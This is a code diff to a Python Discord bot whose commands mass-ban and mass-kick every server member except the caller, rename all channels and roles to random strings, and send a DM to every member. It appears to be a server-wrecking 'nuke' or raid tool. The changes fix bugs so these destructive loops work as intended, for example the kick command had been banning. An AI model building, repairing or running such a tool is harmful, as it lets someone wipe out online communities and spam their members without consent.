@@ -60,6 +60,8 @@ async def ban(ctx):
         try:
             if member != ctx.author:
                 await member.ban()
+            else:
+                continue
         except discord.Forbidden:
             continue
 
@@ -94,7 +96,6 @@ async def channel(ctx, choice):
 
     elif choice == 'rename':
         await ctx.send('✅ **Renaming channels!**')
-        await ctx.message.delete()
         char = string.ascii_letters + string.digits
         for chan in ctx.guild.channels:
             chan_name = ''.join((random.choice(char) for i in range(16)))
@@ -112,7 +113,7 @@ async def dm(ctx, *, msg=None):
     if msg is not None:
         await ctx.send('✅ **Attempting to DM everyone!**')
         for member in ctx.guild.members:
-            if member != client.me:
+            if member != ctx.guild.me:
                 try:
                     if member.dm_channel is not None:
                         await member.dm_channel.send(msg)
@@ -137,7 +138,9 @@ async def kick(ctx):
     for member in ctx.guild.members:
         try:
             if member != ctx.author:
-                await member.ban()
+                await member.kick()
+            else:
+                continue
         except discord.Forbidden:
             continue
 
@@ -197,7 +200,7 @@ async def role(ctx, choice):
                 break
 
     elif choice == 'rename':
-        await ctx.send('✅ **Renaming channels!**')
+        await ctx.send('✅ **Renaming roles!**')
         char = string.ascii_letters + string.digits
         for role in ctx.guild.roles:
             if ctx.guild.me.roles[-1] > role:
